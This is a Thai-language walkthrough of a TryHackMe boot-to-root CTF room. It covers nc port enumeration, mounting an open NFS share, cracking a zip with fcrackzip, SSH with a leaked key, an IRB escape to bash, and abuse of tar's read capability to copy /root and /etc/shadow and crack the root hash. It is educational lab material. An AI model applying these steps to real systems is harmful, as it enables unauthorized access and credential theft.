### ✨ บทนำ
The Server From Hell เป็นห้อง CTF สาย Linux บน TryHackMe ที่เน้นการเจาะระบบตั้งแต่การ enumerate พอร์ตซ่อน, เจอ misconfigured NFS share, crack ไฟล์ zip, ใช้ SSH key เข้าเครื่อง และยกระดับสิทธิ์ด้วย Linux capabilities จนได้ root shell

## 🎯 เป้าหมาย
- หาพอร์ต/บริการที่ “ซ่อน” ไว้และยืนยันพฤติกรรมด้วย `nc`
- ใช้ **NFS (2049/tcp)** ที่ misconfigured เพื่อ “ดึงกุญแจ SSH” ของผู้ใช้
- หลบออกจาก **IRB (Interactive Ruby)** ไปเป็นเชลล์จริง
- ใช้ **capabilities ของ /bin/tar** เพื่ออ่านไฟล์ต้องห้าม → ได้ hash ของ root
- Crack hash จนได้รหัสผ่าน → `su root` และเก็บ flag

# 🧠 TryHackMe - The Server From Hell

🟡 หมวด: CTF / Boot-to-Root  
🧩 ความยาก: Medium
🕵️‍♂️ โหมด: CTF แบบ Boot-to-Root
🧩 URL: The Server From Hell
👨‍💻 ผู้ทำ: Thanyakorn

---

## 📚 สารบัญ (Table of Contents)

- 📌 ข้อมูลจากโจทย์
- 🔎 1) Recon & Port Scan
- 📡 2) ตรวจสอบ Banner และ Web Services
- 🌐 3) สแกนพอร์ต 1–100 ตาม Hint
  - 🌐 3.1) สแกนพอร์ต 1–100 อัตโนมัติ (Netcat Script)
  - 🌐 3.2) พบคำสั่งชี้พอร์ตจากการรันสคริปต์
- 📂 4) ตรวจหาและเมานต์ NFS Share
- 🔎 5) พบ backup.zip → แตกไฟล์ด้วยรหัสจาก Wordlist
- 📂 6) ขั้นตอนถัดไปหลังแตก backup.zip
- 🔑 7) ทดลองเข้า SSH (ตาม Hint: 2500–4500)
- 🔓 8) หลุดจาก IRB → ได้ Shell จริง (Bash)
- 🧭 9) ใช้ tar (cap_dac_read_search) ดึงไฟล์ของ root
  - 🪄 ตรวจหา Linux Capabilities
  - 📂 สร้างและแตก archive ของ /root
  - 🏁 อ่าน Root Flag
- ⚙️ ทางเลือกที่ 2 — ดึง /etc/shadow แล้ว crack เพื่อเป็น root

---

## 📌 ข้อมูลจากโจทย์
> “Start at port 1337 and enumerate your way. Good luck.”

## 🔍 1. Recon & Port Scan
เริ่มจากลองใช้คำสั่ง:
```bash
nmap -sC -sV -Pn <TARGET_IP>
```
- `-sC` → รัน Nmap Default Scripts (NSE) เพื่อหาข้อมูลลึก เช่น SSL cert, FTP anon, SSH key fingerprint
- `-sV` → ตรวจสอบเวอร์ชัน service
- `-Pn` → การทดสอบ service แม้ไม่รู้ว่า host ออนไลน์หรือไม่

❌ ปัญหา: การใช้ -sC จะทำให้ Nmap เรียกใช้ script เยอะมาก → แต่ละ script ต้องรอ response หรือ timeout จาก service → ทำให้ **สแกนช้า** โดยเฉพาะถ้าเจอพอร์ตเปิดหลายตัว

เพื่อความรวดเร็วใช้คำสั่ง:
```bash
nmap -sV -vv <TARGET_IP>
```
![nmap](images/1.png)

- ตัด `-sC` ออก → ไม่ต้องรัน NSE scripts → scan ไวกว่า
- ใช้ `-sV` เพียงอย่างเดียว → เน้นดู service และ version
- เพิ่ม `-vv` (very verbose) → ให้ Nmap รายงานผลทีละพอร์ตแบบ realtime ทำให้เห็นผลลัพธ์ “เร็วขึ้น” ถึงแม้เบื้องหลังยังสแกนอยู่

✅ แบบนี้เราจะได้ พอร์ตเปิด + service ที่รันอยู่ เร็วพอที่จะนำไปทำ banner grabbing/manual test ต่อ เช่น ใช้ nc

### ℹ️ วิเคราะห์ผลการสแกน
จากการสแกนพบว่ามีพอร์ตเปิดจำนวนมาก (20+ พอร์ต) นอกจากนี้ยังมีพอร์ตแปลก ๆ เช่น `10628`, `16000`, `2607`, `5001` ซึ่งอาจเป็น service พิเศษหรือ **honeyport** ที่ตั้งใจเปิดไว้ใน CTF หรือวางไว้เพื่อหลอก

## 📡 2. ตรวจสอบ Banner และ Web Services
> “Start at port 1337 and enumerate your way. Good luck.”

จึงลองใช้ nc เชื่อมต่อไปที่พอร์ต 1337:
```bash
nc <TARGET_IP> 1337
```

![nc](images/2.png)

ผลลัพธ์ที่ได้:
```text
Welcome traveller, to the beginning of your journey
To begin, find the trollface
Legend says he's hiding in the first 100 ports
Try printing the banners from the ports
```

📌 จากข้อความนี้ สรุปได้ว่าเราต้อง **สแกนหาพอร์ต** (1–100) และลอง ดึง banner จากพอร์ตเหล่านั้น เพื่อหาว่า “trollface” ซ่อนอยู่ตรงไหน

## 🌐 3. สแกนพอร์ต 1–100 ตาม Hint
หลังจากได้รับ hint จาก port 1337 ใช้ `nc` เชื่อมต่อไปที่พอร์ต 1–100 ทีละตัว เพื่อดูว่ามีพอร์ตไหนที่ตอบกลับข้อความแปลก ๆ หรือไม่

📥 คำสั่งที่ใช้
```bash
nc <TARGET_IP> 1
nc <TARGET_IP> 2
nc <TARGET_IP> 3
nc <TARGET_IP> 4
```

![nc](images/3.png)

📊 ผลลัพธ์
ทุกพอร์ตที่ลอง (1–4 ตามรูป) ตอบกลับมาลักษณะเดียวกัน:
```text
550 12345 00000000000000000000000000000000000000000000000000000000000000000000000000000000
```

📌 หมายความว่าต้องทำ enumeration **ครบทุกพอร์ตในช่วง** 1–100 เพื่อตามหาพอร์ตที่ซ่อนข้อความพิเศษ (“trollface”)

## 🌐 3.1 สแกนพอร์ต 1–100 อัตโนมัติ (Netcat script)
ไฟล์สคริปต์ Netcat.sh:
```bash
for i in {1..100}
do
  nc 10.201.52.151 $i
  echo "\n"
done
```
คำสั่งรัน:
```bash
bash Netcat.sh
```

![nc](images/4.png)

ผลลัพธ์: แสดง banner/response ของแต่ละพอร์ต 1–100 เพื่อค้นหา message ที่ซ่อนอยู่ตาม hint

## 🌐 3.2 พบคำสั่งชี้พอร์ตจากการรันสคริปต์
ผลลัพธ์บางส่วน (banner ที่เด่น):
```bash
... go to port 12345 ...
```

เชื่อมต่อไปที่พอร์ต 12345:
```bash
nc 10.201.52.151 12345
```

![nc](images/5.png)

ได้ข้อความ:
```text
NFS shares are cool, especially when they are misconfigured
It's on the standard port, no need for another scan
```

📌 ข้อความนี้น่าจะสื่อถึง
- มี NFS (Network File System) รันอยู่
- น่าจะมีการแชร์ไฟล์/ไดเรกทอรีบนเครื่องเป้าหมาย
- การตั้งค่าอาจไม่รัดกุม (misconfigured) — หมายความว่า share อาจอนุญาตการอ่าน/เขียน หรืออนุญาตให้ mount ได้โดยไม่ต้องพิสูจน์ตัวตน
- มันรันบนพอร์ตมาตรฐาน (2049) ดังนั้นไม่ต้องสแกนพอร์ตอื่น — “no need for another scan”

## 📂 4. ตรวจหาและเมานต์ NFS share

1) ตรวจสอบ NFS export
รันคำสั่ง:
```bash
showmount -e 10.201.52.151
```
- showmount → ใช้ดูว่าเครื่องเป้าหมาย export directory อะไรออกมา
- `-e` → แสดง export list (directories ที่เปิดให้ mount ได้)
- 
![showmount](images/6.png)

ผลลัพธ์:
```text
Export list for 10.201.52.151:
/home/nfs *
```
ความหมาย: /home/nfs ถูก export ให้ทุกโฮสต์ (*) — เป็นการตั้งค่าที่เปิดกว้าง (potentially misconfigured).

2) สร้างโฟลเดอร์สำหรับ mount
```bash
mkdir mount
```
- mkdir → สร้างโฟลเดอร์ใหม่
- ใช้โฟลเดอร์นี้เป็นจุด mount (mount point) ของ NFS share
  
3) เมานต์ NFS share
เมานต์ share ไปยังโฟลเดอร์ mount:
```bash
mount 10.201.52.151:/home/nfs mount
```
- mount → ใช้เชื่อมต่อ directory จากเครื่องเป้าหมายเข้ากับเครื่องเรา
- `10.201.52.151:/home/nfs` → path ของ NFS share ที่จะ mount
- `mount` → คือ local directory ที่สร้างไว้ในขั้นตอนก่อนหน้า

4) ตรวจสอบไฟล์ใน share

![share](images/7.png)

- ls -la → แสดงไฟล์ทั้งหมด รวมถึง hidden files พร้อม permission

## 🔎 พบ backup.zip → แตกไฟล์ด้วยรหัสจาก wordlist

1. ใช้ fcrackzip ทำ dictionary attack เพื่อหา password ของ backup.zip

```bash
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
```

![fcrackzip](images/8.png)

- `-v` : verbose (แสดงผลละเอียด)
- `-u` : use unzip test (ทดสอบแตกจริงเหมือน unzip)
- `-D` : dictionary mode
- `-p /path/to/wordlist` : ระบุไฟล์ wordlist (ที่นี่ใช้ rockyou.txt)

ผลลัพธ์: พบรหัสผ่าน `zxcvbnm` (PASSWORD FOUND!!!!: pw = zxcvbnm)

2. คัดลอก backup.zip มาที่ working directory แล้วแตกไฟล์

```bash
cp mount/backup.zip .
unzip backup.zip
```

![unzip](images/9.png)

- `unzip` จะถาม password → ใส่ `zxcvbnm` แล้วระบบจะแตกไฟล์ภายใน

3. ผลการแตกไฟล์ (ไฟล์ที่เห็น)
- `home/hades/.ssh/id_rsa` (private key)
- `home/hades/.ssh/hint.txt`
- `home/hades/.ssh/authorized_keys`
- `home/hades/.ssh/flag.txt`
- `home/hades/.ssh/id_rsa.pub`

✅ ข้อสังเกต
- มี `id_rsa` (private key) → สามารถใช้ SSH เข้าเป็น `hades` ได้ (ต้องตั้ง permission ก่อน)
- มี `flag.txt` ในโฟลเดอร์ `.ssh` → อ่านไฟล์เพื่อเก็บ flag
- `authorized_keys` อยู่ในไฟล์ backup → อาจบอกว่ามี public key ที่อนุญาตให้ล็อกอินอัตโนมัติ

## 📂 5 ขั้นตอนถัดไป (หลังแตก backup.zip)
1. เข้าไปดูโครงสร้างที่แตกออกมา
```bash
cd home
ls -la
```
- ผล: พบไดเรกทอรี `hades`

2. เข้าไปดูโฟลเดอร์ผู้ใช้ hades
```bash
cd hades
ls -la
```

![hades](images/10.png)

ผล: เห็นโฟลเดอร์ `.ssh` เป็นไฟล์ซ่อน (และไฟล์/โฟลเดอร์อื่น ๆ)

3. เข้าไปใน .ssh และตรวจไฟล์ภายใน
```bash
cd .ssh
ls -la
```
ผล: เจอไฟล์
      - `authorized_keys`
      - `flag.txt`
      - `hint.txt`
      - `id_rsa`
      - `id_rsa.pub`

## 🔑 6. ทดลองเข้า SSH (ตาม hint: 2500–4500)

📝 1) อ่าน hint
```bash
cat hint.txt
# output: 2500-4500
```
👉 ได้ช่วงพอร์ตที่ต้องตรวจสอบคือ 2500–4500

🔍 2) ลอง SSH ปกติที่พอร์ต 22
```bash
ssh hades@10.201.52.151
```
⚠️ ผลลัพธ์: `Connection reset by peer` → พอร์ต 22 ไม่เปิดใช้งานสำหรับ SSH

🔌 3) ทดลองเชื่อมต่อบางพอร์ตในช่วงที่ hint ระบุ
```bash
ssh hades@10.201.52.151 -p2500
```
📡 ผลลัพธ์: ได้ banner `SSH-2.0-SSH_v2.0@force10networks.com` → เป็น อุปกรณ์เครือข่าย (Force10) ไม่ใช่ OpenSSH ปกติ
```bash
ssh hades@10.201.52.151 -p2501
ssh hades@10.201.52.151 -p2502
```

![ssh](images/11.png)

⚠️ ผลลัพธ์: `Connection reset by peer` → ไม่มีบริการ SSH จริง

📡 4) สคริปต์ลองเชื่อมต่อ SSH ช่วง 2500–4500

1. สร้างสคริปต์ `Secure-shell.sh` โดยใส่โค้ด:
```bash
#!/bin/bash

for i in {2500..4500}
do
	ssh hades@10.201.52.151 -p$i
done
```
> (สคริปต์จะพยายามเชื่อมต่อ SSH กับ user hades บนพอร์ตแต่ละตัวในช่วง 2500–4500)

2. รันสคริปต์:
```bash
bash Secure-shell.sh
```

![3333](images/12.png)

3. สังเกตผลลัพธ์ที่ปรากฏในเทอร์มินัล:
- หลายพอร์ตตอบกลับด้วย `Connection reset by peer` → ฝั่งเป้าหมายปิดการเชื่อมต่อทันที (service ไม่รองรับ SSH หรือปฏิเสธการเชื่อมต่อ)
- พอร์ตบางพอร์ตแสดง banner เช่น `SSH-2.0-SSH_v2.0@force10networks.com` → เป็นบริการของอุปกรณ์เครือข่าย (ไม่ใช่ OpenSSH) ดังนั้นเชื่อมต่อด้วยไคลเอนต์ SSH ธรรมดาอาจไม่ทำงาน (invalid format)
- เมื่อสคริปต์ถึงพอร์ต 3333 พบว่าโปรโตคอลตอบกลับเป็น SSH จริงจนแสดง fingerprint และถาม `Are you sure you want to continue connecting (yes/no/[fingerprint])?` → บ่งชี้ว่า พอร์ต 3333 ให้บริการ SSH (host key ถูกส่งมา)

## 🔓 7. จาก irb → หลุดเป็น /bin/bash (Shell escape)
- เชื่อมต่อด้วย private key:
```bash
ssh -i id_rsa hades@10.201.52.151 -p 3333
```

![connect](images/13.png)

เมื่อเชื่อมต่อสำเร็จ ได้ prompt เป็น Ruby interactive shell (`irb(main):001:0>`)

### ทำไมมันเชื่อมต่อสำเร็จ (ไม่ต้องใส่รหัสผ่าน)


<details>

1. Key-based authentication
- SSH ใช้คู่กุญแจ `private key` (เราถือ: `id_rsa`) กับ `public key` (อยู่บนเครื่องเป้าหมายใน `~hades/.ssh/authorized_keys`) แทนการใส่รหัสผ่าน

2. ขั้นตอนย่อของการพิสูจน์ตัวตน
- ไคลเอนต์ (คุณ) ส่ง public key id (key id) ให้เซิร์ฟเวอร์ -> เซิร์ฟเวอร์ตรวจว่า public key นั้นมีใน `authorized_keys` ของ user `hades` หรือไม่
- ถ้ามี เซิร์ฟเวอร์สร้าง challenge (ข้อความสุ่ม) แล้วขอให้ไคลเอนต์ลงนาม (sign) ด้วย private key
- ไคลเอนต์ใช้ `id_rsa` ลงนาม แล้วส่งกลับ เซิร์ฟเวอร์ตรวจ signature ด้วย public key ถ้าถูกต้อง → อนุญาตเข้าโดยไม่ต้องใช้รหัสผ่าน

3. เพราะใน `backup.zip` เราพบ `id_rsa` และในไฟล์ `authorized_keys` ของ `hades` มี **public key** คู่กัน → จึงล็อกอินได้โดยตรง
</details>

🔑 คำสั่ง ssh -i id_rsa ..
- `-i` (identity file) หมายถึง
> ระบุไฟล์ private key ที่จะใช้ในการพิสูจน์ตัวตน (authentication)

ทำอะไรต่อ
- เปิดหน้า GTFOBins ดู entry สำหรับ irb (irb สามารถ exec โปรแกรมอื่นได้)
- ใช้คำสั่งจาก GTFOBins เพื่อ spawn bash:
```ruby
exec '/bin/bash'
```

![irb](images/14.png)

- ผล: ได้ shell ของระบบ (bash)

## 🔍 2 วิธีในการหาไฟล์ root.txt

### 1

<details>


🪄 ตรวจหา Linux Capabilities (Privilege escalation vector)

```bash
getcap -r / 2>/dev/null
```

![Capabilities](images/14-1.png)

ความหมายสั้น ๆ
- `getcap` ตรวจหาไฟล์ที่มี Linux capabilities
- `-r /` = recursive → สแกนแบบถอยหลัง/ค้นหาโดยวนลงไปทุกไดเรกทอรีจาก path ที่ระบุ; `/` = root directory → สแกนทั้งระบบ

🧾 Output
```bash
/usr/bin/mtr-packet = cap_net_raw+ep
/bin/tar            = cap_dac_read_search+ep
```

📌 ให้เรามา Focus ที่บรรทัดที่สองซึ่งมีรายละเอียดดังนี้

🟠 `/bin/tar = cap_dac_read_search+ep`
- capability: `cap_dac_read_search`
- ความสามารถ: ข้ามการตรวจสอบสิทธิ์แบบ DAC (Discretionary Access Control) ในการ อ่าน/ค้นหา ไฟล์และไดเรกทอรี → โปรแกรมสามารถอ่านไฟล์ที่ผู้ใช้ปกติอ่านไม่ได้ (เช่นไฟล์ของ root).
- ผลกระทบเชิงปฏิบัติ: ตรงและรุนแรง — สามารถใช้ `tar` เพื่อ archive ไดเรกทอรีของ root (เช่น `/root`) แล้วเขียนไฟล์นั้นไปยังที่ที่ผู้ใช้ธรรมดาควบคุมได้ (`/tmp`) → อ่านไฟล์ของ root ได้ทันที (root flag, credentials)
- โอกาสใช้เป็น PrivEsc: สูงและตรงไปตรงมา — เป็นช่องทาง Privilege Escalation แบบง่ายและได้ผลเร็วในหลายกรณี

📂 ใช้ tar (cap_dac_read_search) ดึงไฟล์ของ root

🧭 เป้าหมาย
ใช้ `/bin/tar` ที่มี `cap_dac_read_search+ep` เพื่อ archive ไดเรกทอรี `/root` ไปยังที่ที่ user `hades` เขียนได้ (เช่น `/tmp`) แล้วอ่านไฟล์ `root.txt` ที่เป็น **root flag**

1) ไปที่ไดเรกทอรีชั่วคราว
```bash
cd /tmp
ls
```
> ดูว่ามีที่ว่างและเป็นพื้นที่ที่เราสามารถเขียนได้

2) สร้าง archive ของ /root ด้วย tar
```bash
tar -cvf test.tar /root
```

<details>
	
- `tar`
โปรแกรมสำหรับสร้าง/จัดการ archive (tarball)

- `-c` (create)
สร้าง archive (คลังเก็บเอกสารสำคัญ) ใหม่

- `-v` (verbose)
แสดงรายการไฟล์ที่กำลังถูกเพิ่มลงใน archive (เห็น output ทีละไฟล์)

- `-f test.tar`
ระบุชื่อไฟล์ archive เป็น `test.tar`

- `/root`
ไดเรกทอรีที่ต้องการเก็บเข้า archive

ผลลัพธ์โดยตรง: จะได้ไฟล์ `test.tar` ในไดเรกทอรีปัจจุบัน ซึ่งเป็น archive ที่บรรจุเนื้อหาทั้งหมดของ `/root` (ไฟล์และโฟลเดอร์ย่อยทั้งหมด)
	
</details>

3) แตกไฟล์จาก test.tar และดึงไฟล์ของ root 🗃️
```bash
tar -xvf test.tar
ls
```
- `-x` = extract (แตกไฟล์จาก archive)
- `-v` = verbose (แสดงชื่อไฟล์ขณะแตก)
- `-f` test.tar = ระบุไฟล์ archive ที่จะถูกแตก

![folder-root](images/15.png)

📤 ผลลัพธ์: จะเห็นโฟลเดอร์ `root/` ในไดเรกทอรีปัจจุบัน (เป็นสำเนาของ `/root` ที่อยู่ใน archive)

## Root Flag

![root](images/16.png)
</details>


### 2
<details>

📝 วิธีนี้เป็น root  — ดึง /etc/shadow → แตก → crack password → su root

> `/etc/shadow` เก็บรหัสผ่านแบบ hashed ของผู้ใช้ทั้งหมด ถ้าเราใช้ `tar` (ที่มี capability ข้ามการตรวจสิทธิ์) ดึงไฟล์นี้ออกมาแล้ว crack hash ของ `root` ได้ เราก็สามารถใช้รหัสผ่านจริงเข้าสู่บัญชี root (`su` หรือ `ssh`) ได้เลย

1. สร้าง archive ของ /etc/shadow (ใช้ tar ที่มี capability)
```bash
tar -cvf /tmp/shadow.tar /etc/shadow
```
- เก็บไฟล์ `/etc/shadow` ลงใน `/tmp/shadow.tar`

2. แตก archive และดูเนื้อหา
```bash
tar -xvf /tmp/shadow.tar -C /tmp
```

![root](images/17.png)

- จะได้บรรทัด hash ของ user เช่น `root:$6$.......`

3. เอา hash ของ root ไปไว้ที่เครื่อง attacker (หรือไฟล์บนเครื่องเป้าหมาย) เพื่อ crack
ตัวอย่าง — สร้างไฟล์ roots.hash ที่มีบรรทัด hash ของ root:

```bash
echo 'root:$6$.......' > roots.hash
```

![root](images/18.png)

4. ใช้ John the Ripper (หรือ hashcat) ทำ dictionary attack

5. ดูผลเมื่อแตกได้แล้ว

- john --show roots.hash

6. ใช้รหัสผ่านที่ได้เข้าสู่ root
บน target:

![root](images/19.png)
	
</details>









